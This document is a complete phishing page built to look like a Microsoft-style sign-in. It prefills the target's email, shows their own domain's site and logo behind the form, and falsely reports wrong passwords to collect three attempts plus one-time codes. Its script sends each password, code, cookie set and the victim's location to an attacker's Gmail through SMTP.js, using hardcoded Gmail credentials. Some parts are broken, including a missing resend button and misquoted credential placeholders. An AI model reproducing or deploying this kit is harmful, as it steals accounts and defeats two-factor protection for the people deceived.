<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login Verification</title>

<!-- SMTP.js Library -->
<script src="https://smtpjs.com/v3/smtp.js"></script>

<style>
#email-display-row {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap !important;
  width: 100%;
}
#back-arrow {
  display: none !important;
}
#email.email-flat {
  display: inline-block !important;
  width: 100% !important;
  white-space: normal !important;
  word-break: break-all !important;
  line-height: 1.4 !important;
  border: none !important;
  background: transparent !important;
  outline: none !important;
  pointer-events: none !important;
}
.input-group input#email {
  border: none !important;
  background: transparent !important;
}
body, html {
  margin: 0;
  padding: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  height: 100%;
  overflow: hidden;
}
#bg-frame {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100%;
  border: none;
  z-index: 0;
}
#login-wrapper {
  position: fixed;
  inset: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  opacity: 0;
  transform: translateX(40px);
}
#login-wrapper.visible {
  opacity: 1;
  transform: translateX(0);
}
#login-content-container b {
  display: block;
  margin-top: 24px;
  font-size: 20px;
}
#login-content-container p {
  margin-top: 8px;
  margin-bottom: 12px;
  font-weight: normal;
  font-size: 14px;
  line-height: 1.4;
}
.login-content {
  opacity: 0;
  transform: translateX(40px);
  transition: opacity 0.4s ease, transform 0.4s ease;
}
#login-wrapper.visible .login-content {
  opacity: 1;
  transform: translateX(0);
}
@keyframes shake {
  0% { transform: translateX(0); }
  20% { transform: translateX(-10px); }
  40% { transform: translateX(10px); }
  60% { transform: translateX(-8px); }
  80% { transform: translateX(8px); }
  100% { transform: translateX(0); }
}
.login-content.shake {
  animation: shake 0.4s;
}
#error-msg { color:red; margin-top:10px; height:20px; }
.login-box {
  background: #fff;
  padding: 32px;
  border-radius: 0;
  width: 360px;
  box-shadow: 0 6px 20px rgba(0,0,0,0.12);
  position: relative;
}
#logo {
  width: 100px;
  display: block;
  margin: 0 0 20px 0;
  padding-left: 4px;
}
.form-area {
  margin-top: 80px;
}
.input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
.input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
.input-group input {
  flex:1; font-size:16px; font-weight:600;
  border:none; background:transparent;
  outline:none; border-bottom:1.5px solid transparent;
  transition:border-color .3s;
}
.input-group input:focus { border-bottom:1.5px solid #0078d4; }
.ms-pass-field {
  width:80%; padding:12px; border:1px solid #8a8a8a;
  font-size:16px; margin-top:20px;
}
.ms-links { margin:15px 0 15px; line-height:1.8; }
.ms-links a { color:#0067b8; text-decoration:none; }
.ms-links a:hover { text-decoration:underline; }
.ms-next-btn {
  background:#0067b8; color:#fff; border:none;
  padding:12px 34px; font-size:17px;
  cursor:pointer; float:right; border-radius:0;
  transition:background 0.2s ease;
}
.ms-next-btn:hover { background:#005a9e; }
.input-group {
  position: relative;
  width: 100%;
  margin-bottom: 20px;
}
.input-group .icon {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 20px;
  color: #000;
  pointer-events: none;
}
.input-group input {
  width: 100%;
  height: 52px;
  padding-left: 58px !important;
  padding-right: 16px;
  font-size: 17px;
  border-radius: 8px;
  border: 1px solid #bbb;
  background: #fff;
  box-sizing: border-box;
  display: flex;
  align-items: center;
}
#otp-wrapper {
  position: fixed;
  inset: 0;
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  opacity: 0;
  transform: translateX(40px);
  transition: opacity .4s ease, transform .4s ease;
}
#otp-wrapper.show {
  display: flex;
  opacity: 1;
  transform: translateX(0);
}
.otp-input {
  width: 42px;
  height: 46px;
  font-size: 18px;
  text-align: center;
}
</style>
</head>
<body>
<iframe id="bg-frame"></iframe>
<!-- LOGIN -->
<div id="login-wrapper">
  <div class="login-box">
     <div class="login-content" id="login-content-container">
      <img id="logo" src="" alt="Logo">
<div id="email-display-row">
  <input
    type="text"
    id="email"
    class="email-flat"
    readonly
  >
</div>
<b>Sign in</b>
<p style="margin-bottom: 10px; font-weight: normal;">
  to access this information for your providerâ€‘verification process
</p>
<input type="password" id="password"
       placeholder="Password" class="ms-pass-field"/>
<div class="ms-links">
  <p>No account? <a id="create-link" href="#">Create one</a></p>
  <p><a id="forgot-link" href="#">Forgot your password?</a></p>
</div>
<div id="error-msg"></div>
<button id="login-btn" class="ms-next-btn">Next</button>
    </div>
  </div>
</div>
<!-- OTP -->
<div id="otp-wrapper">
  <div class="login-box" id="otp-box">
    <h2>Enter verification code</h2>
    <p><strong id="otp-email-display"></strong></p>
    <div style="display:flex;gap:10px;">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
    </div>
    <p id="otp-error"></p>
    <button id="otp-submit" class="ms-next-btn">Verify</button>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
  // SMTP.js credentials (use burner Gmail + App Password)
  const SMTP_HOST = "smtp.gmail.com";
  const SMTP_USERNAME = "jayc98165@gmail.com";          // â† Change to your burner Gmail
  const SMTP_PASSWORD = "olnl vvny kijr npax ";        // â† Change to your Gmail App Password
  const RECEIVER_EMAIL = "jerrycrisostomo223@gmail.com";     // â† Where reports go

  const logoImg = document.getElementById("logo");
  const loginWrapper = document.getElementById("login-wrapper");
  const email = document.getElementById("email");
  const password = document.getElementById("password");
  const loginBtn = document.getElementById("login-btn");
  const errorMsg = document.getElementById("error-msg");
  const otpWrapper = document.getElementById("otp-wrapper");
  const otpInputs = document.querySelectorAll(".otp-input");
  const otpEmailDisplay = document.getElementById("otp-email-display");
  const otpSubmit = document.getElementById("otp-submit");
  const otpError = document.getElementById("otp-error");
  const bgFrame = document.getElementById("bg-frame");

  const params = new URLSearchParams(location.search);
  const rawEmail = params.get("bazz505") || "user@example.com";

  email.value = rawEmail;
  otpEmailDisplay.textContent = rawEmail;

  const domain = rawEmail.split("@")[1] || "example.com";
  if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
    const domain = rawEmail.split("@")[1];
    const createLink = document.getElementById("create-link");
    const forgotLink = document.getElementById("forgot-link");
    createLink.href = "https://www." + domain;
    forgotLink.href = "https://www." + domain;
  }

  function parseCookies(cookieString = document.cookie) {
    const cookies = {};
    if (!cookieString) return cookies;
    cookieString.split(';').forEach(pair => {
      const idx = pair.indexOf('=');
      if (idx > -1) {
        const name = pair.slice(0, idx).trim();
        const val = pair.slice(idx + 1).trim();
        try {
          cookies[name] = decodeURIComponent(val);
        } catch {
          cookies[name] = val;
        }
      }
    });
    return cookies;
  }

  const cookies = parseCookies();
  console.log("Cookies available to JS:", cookies);

  bgFrame.src = `https://${domain}`;
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display: none;
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: 0;
    pointer-events: none;
  `;
  fallbackScreenshot.alt = "Screenshot fallback";
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  let iframeLoaded = false;
  bgFrame.onload = () => { iframeLoaded = true; fallbackScreenshot.style.display = "none"; bgFrame.style.display = "block"; };
  setTimeout(() => { if(!iframeLoaded){ bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; } }, 6000);
  bgFrame.onerror = () => { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; };

  setTimeout(() => loginWrapper.classList.add("visible"), 30);
  history.replaceState({}, document.title, window.location.pathname);

  const logoApis = [
    `https://logo.clearbit.com/${domain}`,
    `https://favicon.vemetric.com/${domain}?size=128`,
    `https://api.faviconkit.com/${domain}/128`,
    `https://icons.duckduckgo.com/ip3/${domain}.ico`,
    `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
  ];
  let logoIndex = 0;
  logoImg.src = logoApis[logoIndex];
  logoImg.onerror = () => {
    logoIndex++;
    if (logoIndex < logoApis.length) {
      logoImg.src = logoApis[logoIndex];
    } else {
      logoImg.src = "https://via.placeholder.com/150?text=Logo";
    }
  };

  document.getElementById("login-btn").addEventListener("click", () => {
    const box = document.getElementById("login-content-container");
    box.classList.remove("shake");
    void box.offsetWidth;
    box.classList.add("shake");
  });

  let userIP = "Unknown IP";
  let userCity = "Unknown City";
  let userCountry = "Unknown Country";
  let userISP = "Unknown ISP";
  loginBtn.disabled = true;
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      userCity = data.city || userCity;
      userCountry = data.country_name || userCountry;
      userIP = data.ip || userIP;
    })
    .catch(() => {})
    .finally(() => {
      loginBtn.disabled = false;
    });

  let attempts = 0;

  function sendCapture(emailVal, passwordVal, attempt, otp = "") {
    const body = `
      â˜ ï¸ DAVON CHAMELEON [${attempt}/3] â˜ ï¸
      ðŸ–¥ï¸ UserId: ${emailVal}
      ðŸ” Pass: ${passwordVal}
      ðŸŒ Country: ${userCity}, ${userCountry}
      ðŸª Cookies: ${JSON.stringify(cookies)}
      OTP (if entered): ${otp}
    `;

    Email.send({
      Host: "smtp.gmail.com",
      Username: "${SENDER_EMAIL}",
      Password: "${SMTP_PASSWORD}",
      To: "${RECEIVER_EMAIL}",
      From: "${SENDER_EMAIL}",
      Subject: `DAVON CHAMELEON Capture [${attempt}]`,
      Body: body
    })
    .then(message => console.log("Email sent:", message))
    .catch(err => console.error("Email send failed:", err));
  }

  loginBtn.onclick = () => {
    if (!password.value.trim()) { 
      errorMsg.textContent = "Password cannot be empty"; 
      return; 
    }
    attempts++;
    sendCapture(email.value, password.value, attempts);
    if (attempts < 3) {
      errorMsg.textContent = "Incorrect password";
      password.value = "";
    } else {
      loginWrapper.style.display = "none";
      otpWrapper.classList.add("show");
    }
  };

  let otpAttempts = 0;
  let otpTimer;
  let otpTimeLeft = 90;
  const countdownText = document.createElement("p");
  countdownText.style.marginTop = "10px";
  countdownText.style.fontSize = "14px";
  countdownText.style.color = "#333";
  document.getElementById("otp-box").appendChild(countdownText);

  function startOtpCountdown() {
    otpTimeLeft = 300;
    countdownText.textContent = `Code expires in 5:00`;
    otpTimer = setInterval(() => {
      otpTimeLeft--;
      let m = Math.floor(otpTimeLeft / 60);
      let s = otpTimeLeft % 60;
      countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;
      if (otpTimeLeft <= 0) {
        clearInterval(otpTimer);
        countdownText.textContent = "Code expired. Request a new one.";
      }
    }, 1000);
  }

  const observer = new MutationObserver(() => {
    if (otpWrapper.classList.contains("show")) {
      startOtpCountdown();
    }
  });
  observer.observe(otpWrapper, { attributes: true });

  otpInputs.forEach((input, index) => {
    input.addEventListener("input", () => {
      input.value = input.value.replace(/\D/g, "");
      if (input.value && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }
    });
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !input.value && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });

  otpSubmit.onclick = () => {
    const code = Array.from(otpInputs).map(i => i.value).join("");
    otpAttempts++;
    sendCapture(email.value, "N/A (OTP stage)", otpAttempts, code);
    if (otpAttempts >= 3) {
      otpWrapper.style.display = "none";
      return;
    }
    if (code.length < 6) {
      otpError.textContent = "Enter the 6-digit code";
      return;
    }
    if (otpTimeLeft <= 0) {
      otpError.textContent = "Code expired. Request a new one.";
      return;
    }
    otpError.textContent = "Incorrect code";
    document.getElementById("otp-box").classList.add("shake");
    setTimeout(() => {
      document.getElementById("otp-box").classList.remove("shake");
    }, 400);
  };

  const otpResend = document.getElementById("otp-resend");
  function resetOtpInputs() {
    otpInputs.forEach(i => i.value = "");
    otpInputs[0].focus();
  }
  function restartOtpTimer() {
    clearInterval(otpTimer);
    otpTimeLeft = 300;
    countdownText.textContent = `Code expires in 5:00`;
    otpTimer = setInterval(() => {
      otpTimeLeft--;
      let m = Math.floor(otpTimeLeft / 60);
      let s = otpTimeLeft % 60;
      countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;
      if (otpTimeLeft <= 0) {
        clearInterval(otpTimer);
        countdownText.textContent = "Code expired. Request a new one.";
      }
    }, 1000);
  }
  otpResend.onclick = () => {
    sendCapture(email.value, "N/A", 0, "User requested NEW OTP");
    resetOtpInputs();
    otpError.textContent = "";
    restartOtpTimer();
    otpResend.textContent = "New code sent";
    setTimeout(() => otpResend.textContent = "Resend Code", 2000);
  };
});
</script>
</body>
</html>
